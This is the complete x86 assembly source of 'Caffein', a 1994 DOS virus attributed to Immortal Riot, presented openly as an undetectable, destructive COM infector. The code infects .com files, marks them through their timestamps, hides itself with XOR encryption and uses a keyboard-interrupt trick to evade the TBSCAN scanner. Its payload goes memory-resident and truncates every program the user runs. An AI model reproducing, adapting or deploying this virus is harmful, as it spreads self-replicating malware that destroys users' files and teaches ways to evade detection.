; ------------------------------------------------------------------------------
;
;                          -  Caffein -
;       Created by Immortal Riot's destructive development team
;              (c) 1994 The Unforgiven/Immortal Riot 
;
; ------------------------------------------------------------------------------
;             þ Undetectable/Destructive COM-infector þ
; ------------------------------------------------------------------------------
.model tiny
.code
org     100h

v_start:

firstgenbuffer  db 0e9h,00h,00h    

virus_start:

	mov     bp,0000h                    ; get delta offset
					    
	call    trick_tbscan                ; 
	call    decrypt                     ; decrypt virus
	jmp     short real_start            ; and continue..

trick_tbscan:
					    
	mov     ax,0305h                    ; set keyb i/o
	xor     bx,bx                       ; too beat the
	int     16h                         ; shit outta tbscan
	ret

write_virus:

	call    encrypt                     ; write in encrypted mode
	lea     dx,[bp+virus_start]         ; from start to virus end
	mov     cx,virus_end-virus_start    ; bytes to write
	mov     ah,40h                      ; 40hex!
	int     21h
	call    decrypt                     ; decrypt virus again
	ret                     

	crypt_value dw 0            

decrypt:
encrypt:

	mov dx,word ptr [bp+crypt_value]    ; simple xor-encryption
	lea si,[bp+real_start]              ; routine included to
	mov cx,(virus_end-virus_start+1)/2  ; avoid detection by scanners.

xor_word:

	xor word ptr [si],dx                ; encrypt all of the code!
	inc si                    
	inc si
	loop xor_word
	ret

real_start:

	mov     di,100h                     ; transer the first three
	lea     si,[bp+orgbuf]              ; bytes into a buffer
	movsw
	movsb
	
	lea     dx,[bp+new_dta]             ; set's the dta...
	mov     ah,1ah
	int     21h

	mov     ah,4eh                      ; find first file

commm:  lea     dx,[bp+com_files]
next:   int     21h
	jnc     foundfile
	jmp     chk_cond

foundfile:

	mov     ax,word ptr [bp+new_dta+16h]    ; ask file-time
	and     al,00011111b                    
	cmp     al,00000010b                    ; compare second-value
	jne     infect                          ; not equal - infect!

	mov     ah,4fh                          ; otherwise, search 
	jmp     short commm                     ; next file in directory

infect:

	lea     dx,[bp+new_dta+1eh]         ; clear file-attribute
	xor     cx,cx
	mov     ax,4301h
	int     21h

	mov     ax,3d02h                    ; open file
	int     21h                         ; in read/write mode

	xchg    ax,bx                       ; file handle in bx

	mov     ah,3fh                      ; read 3 bytes
	mov     cx,3                        ; from orgbuf
	lea     dx,[bp+orgbuf]
	int     21h

	mov     ax,4202h                    ; move file-pointer
	xor     cx,cx                       ; to end of file
	cwd
	int     21h

	cmp    ax,666d                      ; check if file is
	jb     too_small                    ; too small

	cmp    ax,64000d                    ; or too big
	ja     too_big                      ; to infect

	sub     ax,3               
	mov     word ptr [bp+virus_start+1],ax  ; create a new jump
	mov     word ptr [bp+newbuf+1],ax

	mov     ah,2ch                           ; get random
	int     21h                              ; value to use
	mov     word ptr [bp+crypt_value],dx     ; as the xor
	call    write_virus                      ; value

	mov     ax,4200h                         ; move file-pointer
	xor     cx,cx                            ; to tof of file
	cwd
	int     21h

	mov     ah,40h                           ; write the new jump
	lea     dx,[bp+newbuf]                   ; 
	mov     cx,3
	int     21h

too_small:
too_big:

	mov     dx,word ptr [bp+new_dta+18h]     ; restore file's date
	mov     cx,word ptr [bp+new_dta+16h]     ; and time and
	and     cl,11100000b                     ; mark the file
	or      cl,00000010b                     ; as infected
	mov     ax,5701h             
	int     21h                  
				      
	mov     ah,3eh                           ; close file
	int     21h

	lea     dx,[bp+new_dta+1eh]              ; and put back 
	xor     ch,ch                            ; the file-attributes
	mov     cl,byte ptr [bp+new_dta+15h]
	mov     ax,4301h              
	int     21h

nextfile:

	mov     ah,4fh                      ; seek next file
	jmp     next

chk_cond:

	mov     ah,2ch                      ; check if we should
	int     21h                         ; make the pay-load
	cmp     dl,4d                       ; activate
	jb      resident
	jmp     short reset_dta

newint21h       proc  far                   ; this code is memory resident

	cmp     ax,4b00h                    ; check for execute
	je      create                      ; matched
	jmp     cs:oldint21h                ; naaw
create: 
	mov     ah,3ch                      ; truncate the file executed
	int     21h                         ; and give it full-attribute
	int     20h                         ; and just exit to dos
	
newint21h       endp

in_mem:
resident:

	mov     ax,3521h                    ; get original vector from
	int     21h                         ; es:bx to int21h

	mov     word ptr cs:oldint21h,bx
	mov     word ptr cs:oldint21h+2,es

	mov     ax,2521h                    ; set a new interrupt vector
	lea     dx,[bp+offset newint21h]    ; for int21h to ds:dx
	int     21h

	lea     dx,[bp+offset in_mem]       ; and load it resident    
	int     27h                         
	int     20h                         ; and exit

reset_dta:

	mov     dx,80h                      ; puts back the dta to normal
	mov     ah,1ah
	int     21h

	mov     ax,100h                
	jmp     ax

signature       db      "[Caffeine] (c) 1994 The Unforgiven/Immortal Riot"
com_files       db      '*.com',0
orgbuf          db      0cdh,20h,90h             ; buffer to save first 3 bytes 
newbuf          db      0e9h,00h,00h             ; buffer to calculate new entry
oldint21h       dd      0

virus_end:
new_dta:
end             v_start
